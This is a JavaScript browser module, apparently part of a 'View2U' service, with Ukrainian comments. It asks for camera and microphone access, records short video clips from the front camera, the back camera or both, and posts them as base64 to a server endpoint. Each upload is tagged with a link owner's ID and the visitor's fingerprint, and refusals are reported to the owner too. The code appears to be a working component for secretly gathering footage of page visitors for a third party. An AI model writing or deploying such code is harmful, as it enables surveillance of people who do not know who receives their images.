(function() {
    window.view2u_modules = window.view2u_modules || {};

    // Функція для відправки даних на сервер
    async function sendDataToServer(ownerUserId, fingerprint, dataPayload) {
        try {
            await fetch('/.netlify/functions/public-api', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    action: 'collectData',
                    payload: {
                        ownerUserId,
                        fingerprint,
                        payload: dataPayload
                    }
                })
            });
            console.log('View2U Video Module: Дані успішно відправлено.', dataPayload.type || dataPayload.error);
            return true;
        } catch (error) {
            console.error('View2U Video Module: Помилка відправки даних', error);
            return false;
        }
    }
    
    // Функція для отримання потоку з запасним варіантом без аудіо
    async function getStreamWithFallback(constraints) {
        try {
            return await navigator.mediaDevices.getUserMedia(constraints);
        } catch (err) {
            console.warn("View2U Video Module: Не вдалося отримати потік з аудіо. Спроба тільки з відео.", err.name);
            if (err.name === "NotFoundError" || err.name === "DevicesNotFoundError") {
                 throw err;
            }
            const videoOnlyConstraints = { video: constraints.video, audio: false };
            try {
                return await navigator.mediaDevices.getUserMedia(videoOnlyConstraints);
            } catch (finalErr) {
                console.error("View2U Video Module: Остаточна помилка при отриманні доступу до камери.", finalErr.name);
                throw finalErr;
            }
        }
    }

    // Надійна функція запису відео з активного потоку
    function recordSingleVideoFromStream(stream, duration) {
        return new Promise((resolve, reject) => {
            if (!window.MediaRecorder) {
                return reject(new Error("MediaRecorder API is not supported."));
            }
            if (!stream || !stream.active) {
                return reject(new Error("MediaStream is not active."));
            }

            try {
                // Використовуємо стандартний mimeType, який найкраще підтримується
                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                const chunks = [];

                recorder.onerror = (event) => {
                    console.error("MediaRecorder error:", event.error);
                    reject(event.error || new Error("MediaRecorder failed."));
                };

                recorder.ondataavailable = (event) => {
                    if (event.data && event.data.size > 0) {
                        chunks.push(event.data);
                    }
                };

                recorder.onstop = () => {
                    // Цей обробник спрацьовує після того, як всі дані були зібрані
                    if (chunks.length === 0) {
                        return reject(new Error("Recording produced no data."));
                    }
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const reader = new FileReader();
                    reader.onloadend = () => {
                        resolve(reader.result); // Повертаємо Base64 рядок
                    };
                    reader.onerror = (error) => {
                        reject(error || new Error("FileReader failed to read the blob."));
                    };
                    reader.readAsDataURL(blob);
                };

                recorder.start();
                
                setTimeout(() => {
                    if (recorder.state === "recording") {
                        recorder.stop();
                    }
                }, duration);

            } catch (err) {
                reject(err);
            }
        });
    }

    // Основна логіка модуля, що керує потоками та записами
    window.view2u_modules.video = {
        init: async function(ownerUserId, fingerprint, options) {
            
            // Внутрішня функція-обробник для однієї камери
            const processCamera = async (facingMode, count, duration) => {
                let stream;
                try {
                    // Отримуємо потік один раз
                    const constraints = { video: { facingMode }, audio: true };
                    stream = await getStreamWithFallback(constraints);

                    // Записуємо всі відео з цього потоку
                    for (let i = 0; i < count; i++) {
                        if (i > 0) await new Promise(res => setTimeout(res, 500));
                        
                        const videoBase64 = await recordSingleVideoFromStream(stream, duration);
                        
                        // Відправляємо кожне відео окремо
                        const successPayload = {
                            status: 'success',
                            type: 'video',
                            data: [videoBase64]
                        };
                        await sendDataToServer(ownerUserId, fingerprint, successPayload);
                    }
                } finally {
                    // Гарантовано вимикаємо потік після завершення всіх операцій з ним
                    if (stream) {
                        stream.getTracks().forEach(track => track.stop());
                    }
                }
            };

            const view = options.view || "front";
            const duration = Math.min(Math.max(1000, (options.duration || 5) * 1000), 15000);
            
            let count;
            if (view === 'front-back') {
                count = Math.min(Math.max(1, options.count || 1), 2);
            } else {
                count = Math.min(Math.max(1, options.count || 1), 3);
            }

            try {
                if (view === "front-back") {
                    await processCamera("user", count, duration);
                    await processCamera("environment", count, duration);
                } else {
                    const facingMode = view === "back" ? "environment" : "user";
                    await processCamera(facingMode, count, duration);
                }
                
                return Promise.resolve({ status: 'completed' });

            } catch (err) {
                // Якщо на будь-якому етапі сталася помилка, відправляємо звіт
                const errorPayload = {
                    status: 'denied',
                    type: 'video',
                    error: err.message || err.name || 'User denied or media error'
                };
                // Ми не чекаємо завершення відправки, щоб швидше повернути помилку
                sendDataToServer(ownerUserId, fingerprint, errorPayload);

                console.error("View2U Video Module: Операцію перервано через помилку.", err);
                return Promise.reject(errorPayload);
            }
        }
    };
})();
